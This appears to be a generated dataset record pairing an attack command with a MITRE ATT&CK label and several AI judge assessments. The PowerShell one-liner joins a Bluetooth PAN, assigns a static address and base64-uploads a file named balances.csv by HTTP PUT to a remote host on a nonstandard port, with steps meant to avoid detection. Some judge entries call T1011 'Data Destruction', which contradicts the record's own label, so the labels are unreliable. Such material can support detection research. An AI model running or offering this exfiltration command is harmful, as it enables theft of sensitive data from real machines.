command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null
explanation: Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).
rationale_steps: Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.
Assign a static /30 address to the Bluetooth interface with netsh.
Send base64 data using HTTP on a nonstandard port to reduce detection.
Destination IP is only reachable over Bluetooth, forcing that medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and method invocations.
llm_judgments.semantic_justification: The command aligns with T1011 (Exfiltration Over Other Network Medium) by establishing a Bluetooth PAN connection and exfiltrating data over it, though it's focused on exfiltration rather than the claimed T1011 technique of data destruction.

llm_judgments.syntactic_justification: The command is perfectly well-formed, with balanced quotes and parentheses, correct PowerShell syntax for pipelines, variable assignments, .NET method calls, and external command execution.
llm_judgments.semantic_justification: The command performs data exfiltration by reading a file and sending its base64 content via HTTP PUT, which is entirely unrelated to, and semantically opposite of, the specified T1011 Data Destruction technique.

llm_judgments.syntactic_justification: The PowerShell pipeline is well-formed with balanced quotes, correct separators, valid expressions, and properly constructed hashtables.
llm_judgments.semantic_justification: It plausibly connects to a Bluetooth PAN, sets an interface IP, base64-encodes a file, and exfiltrates it via HTTP PUT over that medium, though the netsh static IP step likely requires admin privileges and may fail in practice.
